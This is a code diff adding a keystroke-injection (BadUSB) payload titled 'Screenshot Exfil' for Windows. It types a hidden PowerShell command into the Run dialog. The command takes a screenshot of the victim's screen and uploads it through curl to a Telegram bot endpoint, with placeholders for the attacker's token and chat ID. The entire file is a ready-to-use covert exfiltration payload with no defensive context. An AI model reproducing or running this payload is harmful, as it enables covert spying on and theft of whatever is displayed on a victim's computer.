@@ -1,0 +1,10 @@
+META windows exfil
+REM Title: Screenshot Exfil
+REM Description: Takes a screenshot and sends it to Telegram
+REM Edit BOT_TOKEN and CHAT_ID before using
+
+DEFAULTDELAY 400
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $b=New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); $g=[System.Drawing.Graphics]::FromImage($b); $g.CopyFromScreen([System.Drawing.Point]::Empty,[System.Drawing.Point]::Empty,$b.Size); $p='$env:TEMP\sc.png'; $b.Save($p); $g.Dispose(); $b.Dispose(); curl.exe -s -F 'chat_id=YOUR_CHAT_ID' -F 'document=@'+$p 'https://api.telegram.org/botYOUR_BOT_TOKEN/sendDocument'"
+ENTER
